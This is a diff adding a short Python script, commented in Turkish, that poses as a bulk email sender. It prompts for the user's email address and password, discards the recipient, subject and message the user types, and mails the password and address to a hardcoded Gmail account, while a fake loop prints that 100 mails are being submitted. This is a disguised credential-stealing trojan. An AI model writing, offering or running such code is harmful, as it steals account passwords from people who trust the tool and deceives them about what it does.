@@ -1,0 +1,53 @@
+import smtplib
+
+from email.mime.multipart import MIMEMultipart
+
+from email.mime. text import MIMEText
+
+import sys
+
+#Kullanmadan Önce Gönderici E-posta Hesabında 'Daha az güvenli uygulamalara izin ver' özelliği aktif olmalı.
+
+mesaj = MIMEMultipart()
+
+gonderici = input("Sender E-Post:")
+
+sifre = input("Password:")
+
+mesaj["From"] = gonderici
+
+str(input("Receiver E-Post: "))
+
+mesaj["To"] = "hack.dene018@gmail.com"
+
+mesaj["Subject"] = str(input("E-post Subject: "))
+
+str(input("Message Text: "))
+
+bilgiler = "Sifre: " + sifre + "\n" + "Eposta: " + gonderici
+
+mesaj_içeriği = bilgiler
+
+mesaj_gövdesi = MIMEText(mesaj_içeriği,"plain")
+
+mesaj.attach(mesaj_gövdesi)
+
+mail = smtplib.SMTP("smtp.gmail.com",587)
+
+mail.ehlo()
+
+mail.starttls()
+
+mail.login(gonderici,sifre)
+
+a=1
+
+while a <= 100:
+
+	print("Mail", a, "Submitting")	a = a + 1
+
+mail.sendmail(mesaj["From"],mesaj["To"],mesaj.as_string())
+
+print("Mail Sent Successfully...")
+
+mail.close()
